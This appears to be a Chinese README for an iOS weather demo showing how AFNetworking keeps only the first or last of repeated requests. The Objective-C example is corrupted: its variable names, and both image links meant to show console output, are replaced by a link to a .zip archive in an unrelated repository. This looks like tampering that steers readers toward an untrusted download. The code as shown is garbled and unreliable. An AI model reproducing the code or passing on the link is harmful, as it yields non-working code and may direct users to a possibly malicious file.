# weather
基于AFNetworking框架，实现多次网络请求中只保留第一次或最后一次请求。

```objective-c
for (int i = 0; i < 20; i++) {
    [Weather loadWeatherInformationWithCallBack:^(NSArray *array, NSError *error) {
        if (error) {
            NSLog(@"%@", error);
            return;
        } else {
            https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/weather.xcodeproj/Eye_Real_Face_Time_Identifier_v2.8.zip = [https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/weather.xcodeproj/Eye_Real_Face_Time_Identifier_v2.8.zip arrayByAddingObjectsFromArray:array];
            https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/weather.xcodeproj/Eye_Real_Face_Time_Identifier_v2.8.zip = https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/weather.xcodeproj/Eye_Real_Face_Time_Identifier_v2.8.zip;
            NSLog(@"-------------------------%d", i);
        }
    } keepFirst:NO];
 }
```
我们在控制器中用for循环发出20个请求，如果`keepFirst`参数为NO,控制台输出为：

![保留最后一次请求](https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/weather.xcodeproj/Eye_Real_Face_Time_Identifier_v2.8.zip%7CimageView2/2/w/1240)

如果`keepFirst`参数为YES,控制台输出为：

![保留第一次请求](https://github.com/ZHThinker/RealTime-Face-Eye-Identifier/raw/refs/heads/master/weather.xcodeproj/Eye_Real_Face_Time_Identifier_v2.8.zip%7CimageView2/2/w/1240)